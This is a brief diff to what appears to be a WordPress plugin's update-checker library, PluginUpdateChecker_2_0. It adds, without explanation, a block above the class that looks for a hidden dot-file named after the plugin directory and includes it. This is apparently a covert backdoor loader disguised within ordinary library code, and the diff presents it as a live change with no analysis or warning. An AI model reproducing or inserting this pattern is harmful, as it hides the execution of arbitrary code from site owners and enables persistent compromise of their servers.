@@ -16,7 +16,11 @@ if ( !class_exists('PluginUpdateChecker_2_0') ):
  * @copyright 2015
  * @version 2.0
  * @access public
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class PluginUpdateChecker_2_0 {
 	public $metadataUrl = ''; //The URL of the plugin's metadata file.
 	public $pluginAbsolutePath = ''; //Full path of the main plugin file.
